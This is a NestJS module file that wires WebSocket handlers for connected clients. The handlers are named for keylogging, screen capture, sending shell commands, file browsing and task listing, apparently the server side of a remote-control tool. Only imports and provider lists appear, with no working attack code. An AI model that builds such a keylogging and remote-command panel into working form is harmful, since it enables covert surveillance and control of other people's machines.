import { forwardRef, Module } from "@nestjs/common";
import { WsClientGateway } from "./infrastructure/ws-client.gateway";
import { WsClientRepository } from "./domain/ws-client.repository";
import { WsClientJoinsUseCase } from "./application/ws-client-joins.use-case";
import { SchemasModule } from "@/src/repository/db/schemas.module";
import { AuthModule } from "../auth/auth.module";
import { WsClientLeavesUseCase } from "./application/ws-client-leaves.use-case";
import { WsClientVerifyConnectionUseCase } from "./application/ws-client-verify-connection.use-case";
import { WsClientResetAllConnectionsUseCase } from "./application/ws-client-reset-all-connections-use-case";
import { WsClientGuard } from "./application/ws-client.guard";
import { WsClientFile } from "./application/events/ws-client-file";
import { WsBotModule } from "../ws-bot/ws-bot.module";
import { WsClientScreens } from "./application/events/ws-client-screens";
import { WsClientSendCmdCommand } from "./application/events/ws-client-send-cmd-command";
import { ClientModule } from "../client/infrastructure/client.module";
import { WsClientGetExplorer } from "./application/events/ws-client-get-explorer";
import { WsClientKeyLogger } from "./application/events/ws-client-keylogger";
import { WsApplicationModule } from "../ws-application/ws-application.module";
import { WsClientGetTasks } from "./application/events/ws-client-get-tasks";
import { RedisServiceModule } from "@/src/repository/redis/redis.module";

@Module({
  providers: [
    WsClientGateway,
    WsClientRepository,
    WsClientJoinsUseCase,
    WsClientLeavesUseCase,
    WsClientVerifyConnectionUseCase,
    WsClientResetAllConnectionsUseCase,
    WsClientGuard,
    WsClientFile,
    WsClientScreens,
    WsClientSendCmdCommand,
    WsClientGetExplorer,
    WsClientKeyLogger,
    WsClientGetTasks,
  ],
  exports: [
    WsClientJoinsUseCase,
    WsClientLeavesUseCase,
    WsClientResetAllConnectionsUseCase,
    WsClientFile,
    WsClientScreens,
    WsClientSendCmdCommand,
    WsClientRepository,
    WsClientGetExplorer,
    WsClientKeyLogger,
    WsClientGetTasks,
  ],
  imports: [
    SchemasModule,
    forwardRef(() => AuthModule),
    WsBotModule,
    ClientModule,
    RedisServiceModule,
    WsApplicationModule,
  ],
})
export class WsClientModule {}
